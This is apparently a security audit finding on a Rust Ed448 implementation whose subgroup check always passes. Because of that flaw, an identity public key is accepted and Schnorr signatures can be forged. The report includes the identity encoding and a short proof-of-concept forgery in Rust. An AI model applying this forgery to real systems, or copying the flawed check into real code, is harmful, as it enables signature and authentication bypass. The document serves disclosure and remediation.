### Title
Ed448 accepts the identity point, enabling universal Schnorr signature forgery - ([File: crypto/ed448/src/point.rs](crypto/ed448/src/point.rs))

### Summary
`Point::is_torsion_free` computes `(-1 * P) + P`, which is always the identity for every curve point. Consequently, the intended subgroup check never rejects the identity or any other small-order point. `Ciphersuite::read_G` then accepts the canonical Ed448 identity encoding, and `SchnorrSignature::verify` accepts any signature satisfying `R = sG` for that identity public key, regardless of the challenge.

### Finding Description
`is_torsion_free` uses `Scalar::ZERO - Scalar::ONE`, which is `-1` modulo the prime-order scalar modulus. The expression therefore tests whether `P - P == 0`, which is true for every valid curve point rather than checking multiplication by the cofactor or prime subgroup order. [1](#0-0) 

`Point::from_bytes` decodes `y`, recovers `x`, and accepts the point when `point.is_torsion_free()` returns true. Since that predicate is tautological, decoded low-order points are treated as prime-group elements. [2](#0-1) 

The generic `Ciphersuite::read_G` implementation only requires successful decoding and canonical re-encoding; it does not reject the identity. [3](#0-2) 

`SchnorrSignature::verify` evaluates `R + cA - sG == 0`. If `A` is the identity, the challenge term disappears, so any attacker-generated signature with `R = sG` verifies for every challenge. [4](#0-3) [5](#0-4) 

### Impact Explanation
An unprivileged party who can submit an Ed448 public key through `Ed448::read_G`, `SchnorrSignature::read`, or another point-consuming API can register or supply the identity key and then produce universally valid Schnorr signatures for arbitrary challenges and messages handled by the caller.

This is a forged signature accepted by an incorrect verifier formula/input-validation path. It also weakens any protocol that assumes decoded `Ed448::G` values belong to the intended prime-order subgroup.

### Likelihood Explanation
The identity point has a short canonical Ed448 encoding: little-endian `y = 1` with a zero sign bit. It is 57 bytes, with the first byte equal to `1` and all remaining bytes equal to `0`.

Exploitation requires a reachable path in which an attacker can supply the public key or point encoding. In such a path, the forgery is deterministic and requires no private key, nonce leakage, participant collusion, or invalid curve decoding.

### Recommendation
Implement a real subgroup check for Ed448. Multiply the decoded point by the prime subgroup order or otherwise perform a mathematically meaningful cofactor check. Additionally, reject the identity in `Point::from_bytes` unless identity is explicitly supported by a higher-level API.

Do not rely only on canonical encoding checks in `Ciphersuite::read_G`; Ed448 decoding itself should enforce prime-group membership.

### Proof of Concept
Conceptual Rust reproduction:

```rust
use ciphersuite::Ciphersuite;
use crypto_schnorr::SchnorrSignature;
use ed448::Ed448;
use ff::Field;
use group::GroupEncoding;

fn main() {
  // Canonical Ed448 identity encoding:
  // y = 1, encoded little-endian in 57 bytes; sign bit = 0.
  let mut identity_encoding = [0u8; 57];
  identity_encoding[0] = 1;

  // This should reject the identity, but currently accepts it.
  let identity = Ed448::read_G(&mut identity_encoding.as_slice()).unwrap();

  // R = sG with s = 1. No private key is needed.
  let forged = SchnorrSignature::<Ed448> {
    R: Ed448::generator(),
    s: <Ed448 as Ciphersuite>::F::ONE,
  };

  // For A = identity:
  // R + cA - sG = G + c*0 - G = identity,
  // for every challenge value.
  let arbitrary_challenge = <Ed448 as Ciphersuite>::F::from(42u64);
  assert!(forged.verify(identity, arbitrary_challenge));
}
```

The decisive missing check is that `is_torsion_free` currently evaluates `P - P`, so the final acceptance condition in `Point::from_bytes` is ineffective for all decoded points. [6](#0-5)

### Citations

**File:** crypto/ed448/src/point.rs (L294-317)
```rust
impl Point {
  fn is_torsion_free(&self) -> Choice {
    ((*self * (Scalar::ZERO - Scalar::ONE)) + self).is_identity()
  }
}

impl GroupEncoding for Point {
  type Repr = <FieldElement as PrimeField>::Repr;

  fn from_bytes(bytes: &Self::Repr) -> CtOption<Self> {
    // Extract and clear the sign bit
    let sign = Choice::from(bytes[56] >> 7);
    let mut bytes = *bytes;
    let mut_ref: &mut [u8] = bytes.as_mut();
    mut_ref[56] &= !(1 << 7);

    // Parse y, recover x
    FieldElement::from_repr(bytes).and_then(|y| {
      recover_x(y).and_then(|mut x| {
        x.conditional_negate(x.is_odd().ct_eq(&!sign));
        let not_negative_zero = !(x.is_zero() & sign);
        let point = Point { x, y, z: FieldElement::ONE };
        CtOption::new(point, not_negative_zero & point.is_torsion_free())
      })
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/schnorr/src/lib.rs (L88-99)
```rust
  pub fn batch_statements(&self, public_key: C::G, challenge: C::F) -> [(C::F, C::G); 3] {
    // s = r + ca
    // sG == R + cA
    // R + cA - sG == 0
    [
      // R
      (C::F::ONE, self.R),
      // cA
      (challenge, public_key),
      // -sG
      (-self.s, C::generator()),
    ]
```

**File:** crypto/schnorr/src/lib.rs (L102-110)
```rust
  /// Verify a Schnorr signature for the given key with the specified challenge.
  ///
  /// This challenge must be properly crafted, which means being binding to the public key, nonce,
  /// and any message. Failure to do so will let a malicious adversary to forge signatures for
  /// different keys/messages.
  #[must_use]
  pub fn verify(&self, public_key: C::G, challenge: C::F) -> bool {
    multiexp_vartime(&self.batch_statements(public_key, challenge)).is_identity().into()
  }
```
